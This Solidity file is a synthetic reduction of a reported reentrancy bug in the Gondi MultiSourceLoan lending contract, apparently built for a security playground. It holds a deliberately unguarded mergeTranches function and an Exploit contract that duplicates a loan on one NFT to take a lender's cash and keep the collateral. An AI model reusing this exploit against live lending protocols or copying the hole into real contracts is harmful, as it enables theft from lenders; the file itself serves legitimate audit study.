// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gondi MultiSourceLoan — mergeTranches has no nonReentrant
    (Code4rena 2024-04 H-14, AuditVault 35216)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    refinanceFromLoanExecutionData is guarded, but its offer validator
    runs before the new loan is stored. The validator reenters
    mergeTranches, which is not guarded, and writes a second loan for
    the same NFT. Repay one copy, borrow a real lender's cash against
    the NFT, then repay the other copy and take the NFT back.
    The merge write below is the report's line (@> VULN). */

struct Loan {
    address borrower;
    address lender;
    uint256 tokenId;
    uint256 principal;
}

library LoanLib {
    function hash(Loan memory loan) internal pure returns (bytes32) {
        return keccak256(abi.encode(loan.borrower, loan.lender, loan.tokenId, loan.principal));
    }
}

interface IOfferValidator {
    function validateOffer(uint256 loanId, Loan memory loan) external;
}

contract Cash {
    string public constant symbol = "CASH";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        require(balanceOf[from] >= amount, "cash");
        if (msg.sender != from) {
            require(allowance[from][msg.sender] >= amount, "allowance");
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Nft {
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    function mint(address to, uint256 tokenId) external {
        ownerOf[tokenId] = to;
    }

    function setApprovalForAll(address operator, bool approved) external {
        isApprovedForAll[msg.sender][operator] = approved;
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == from, "nft owner");
        require(msg.sender == from || isApprovedForAll[from][msg.sender], "nft approval");
        ownerOf[tokenId] = to;
    }
}

contract VictimLender {
    function approveCash(Cash cash, address spender) external {
        cash.approve(spender, type(uint256).max);
    }
}

contract MultiSourceLoan {
    using LoanLib for Loan;

    error InvalidLoanError();
    error Reentered();

    Cash public cash;
    Nft public nft;
    uint256 public nextId = 1;
    uint256 internal locked;
    mapping(uint256 => bytes32) internal _loans;

    function loans(uint256 id) external view returns (bytes32) {
        return _loans[id];
    }

    constructor(Cash _cash, Nft _nft) {
        cash = _cash;
        nft = _nft;
    }

    modifier nonReentrant() {
        if (locked != 0) revert Reentered();
        locked = 1;
        _;
        locked = 0;
    }

    function _baseLoanChecks(uint256 _loanId, Loan memory _loan) internal view {
        if (_loan.hash() != _loans[_loanId]) revert InvalidLoanError();
    }

    function _getAndSetNewLoanId() internal returns (uint256 loanId) {
        loanId = nextId;
        nextId = loanId + 1;
    }

    function seed(Loan memory _loan) external returns (uint256 loanId) {
        nft.transferFrom(msg.sender, address(this), _loan.tokenId);
        loanId = _getAndSetNewLoanId();
        _loans[loanId] = _loan.hash();
    }

    /// Reduced refinance. The real function is nonReentrant and calls the
    /// offer validator from _processOffersFromExecutionData before it stores
    /// the replacement loan. The id is reserved first, matching the report:
    /// the callback's merge takes the next id, then this write uses the reserved one.
    function refinanceFromLoanExecutionData(uint256 _loanId, Loan memory _loan, address validator)
        external
        nonReentrant
        returns (uint256, Loan memory)
    {
        _baseLoanChecks(_loanId, _loan);
        uint256 loanId = _getAndSetNewLoanId();
        IOfferValidator(validator).validateOffer(_loanId, _loan);
        Loan memory created = Loan({borrower: _loan.borrower, lender: msg.sender, tokenId: _loan.tokenId, principal: 0});
        _loans[loanId] = created.hash();
        delete _loans[_loanId];
        return (loanId, created);
    }

    function mergeTranches(uint256 _loanId, Loan memory _loan, uint256 _minTranche, uint256 _maxTranche)
        external
        virtual
        returns (uint256, Loan memory)
    {
        return _mergeTranchesEntry(_loanId, _loan, _minTranche, _maxTranche);
    }

    function _mergeTranchesEntry(uint256 _loanId, Loan memory _loan, uint256 _minTranche, uint256 _maxTranche)
        internal
        returns (uint256, Loan memory)
    {
        _baseLoanChecks(_loanId, _loan);
        uint256 loanId = _getAndSetNewLoanId();
        Loan memory loanMergedTranches = _mergeTranches(loanId, _loan, _minTranche, _maxTranche);
        // @> VULN: no nonReentrant. A validator callback writes a second live loan for the same NFT.
        _loans[loanId] = loanMergedTranches.hash();
        delete _loans[_loanId];
        return (loanId, loanMergedTranches);
    }

    function lock() public view returns (uint256) {
        return locked;
    }

    function _mergeTranches(uint256, Loan memory _loan, uint256, uint256) internal view returns (Loan memory) {
        return Loan({borrower: _loan.borrower, lender: msg.sender, tokenId: _loan.tokenId, principal: 0});
    }

    function repayLoan(uint256 _loanId, Loan memory _loan) external {
        _baseLoanChecks(_loanId, _loan);
        require(msg.sender == _loan.borrower, "borrower");
        if (_loan.principal != 0) {
            cash.transferFrom(msg.sender, _loan.lender, _loan.principal);
        }
        nft.transferFrom(address(this), _loan.borrower, _loan.tokenId);
        delete _loans[_loanId];
    }

    function borrow(uint256 tokenId, uint256 principal, address lender) external returns (uint256 loanId, Loan memory loan) {
        nft.transferFrom(msg.sender, address(this), tokenId);
        cash.transferFrom(lender, msg.sender, principal);
        loanId = _getAndSetNewLoanId();
        loan = Loan({borrower: msg.sender, lender: lender, tokenId: tokenId, principal: principal});
        _loans[loanId] = loan.hash();
    }
}

contract Exploit {
    uint256 public constant PRINCIPAL = 1000 ether;
    uint256 public constant NFT_ID = 1;

    Cash public cash;
    Nft public nft;
    MultiSourceLoan public loan;
    VictimLender public victim;
    uint256 public mergedId;
    Loan public mergedLoan;
    uint256 public refiId;
    Loan public refiLoan;
    uint256 public victimLoanId;

    constructor() {
        cash = new Cash();
        nft = new Nft();
        loan = new MultiSourceLoan(cash, nft);
        victim = new VictimLender();
        cash.mint(address(victim), PRINCIPAL);
        victim.approveCash(cash, address(loan));
        nft.mint(address(this), NFT_ID);
    }

    function validateOffer(uint256 loanId, Loan memory openLoan) external {
        (mergedId, mergedLoan) = MultiSourceLoan(msg.sender).mergeTranches(loanId, openLoan, 0, 0);
    }

    function run() external {
        uint256 victimBefore = cash.balanceOf(address(victim));
        require(victimBefore == PRINCIPAL, "victim not funded");
        nft.setApprovalForAll(address(loan), true);

        Loan memory loan1 = Loan({borrower: address(this), lender: address(this), tokenId: NFT_ID, principal: 0});
        uint256 id1 = loan.seed(loan1);
        require(nft.ownerOf(NFT_ID) == address(loan), "nft not escrowed");

        (refiId, refiLoan) = loan.refinanceFromLoanExecutionData(id1, loan1, address(this));
        require(loan.loans(refiId) != bytes32(0), "refi loan missing");
        require(loan.loans(mergedId) != bytes32(0), "merged loan missing");
        require(refiLoan.tokenId == NFT_ID && mergedLoan.tokenId == NFT_ID, "nft not duplicated");

        loan.repayLoan(refiId, refiLoan);
        require(nft.ownerOf(NFT_ID) == address(this), "nft not returned");

        (victimLoanId,) = loan.borrow(NFT_ID, PRINCIPAL, address(victim));
        loan.repayLoan(mergedId, mergedLoan);

        require(cash.balanceOf(address(this)) == PRINCIPAL, "attacker was not paid");
        require(cash.balanceOf(address(victim)) == 0, "victim still holds the cash");
        require(nft.ownerOf(NFT_ID) == address(this), "nft not pulled out of the victim loan");
        require(loan.loans(victimLoanId) != bytes32(0), "victim loan was cleared");
    }
}
